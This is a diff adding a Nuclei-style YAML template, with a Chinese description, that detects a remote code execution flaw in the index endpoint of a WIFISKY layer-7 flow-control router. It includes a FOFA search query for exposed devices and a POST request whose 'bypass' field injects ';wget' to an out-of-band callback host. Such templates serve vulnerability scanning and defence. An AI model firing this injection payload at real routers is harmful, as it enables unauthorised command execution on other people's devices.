@@ -1,0 +1,26 @@
+id: wifisky-l7-router-index-rce
+info:
+  name: WIFISKY 7层流控路由器 index 接口远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: Fofa：title="WIFISKY 7层流控路由器"
+        WIFISKY 7层流控路由器的 index 接口存在远程代码执行（RCE）漏洞，攻击者可通过构造恶意请求利用该漏洞在目标系统上执行任意命令，可能导致系统权限被篡夺、数据泄露或服务中断。
+  tags: WIFISKY
+http:
+- raw:
+  - |
+    POST /portal/ibilling/index.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    {"type":5,"version":2,"bypass":";wget {{interactsh-url}}"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
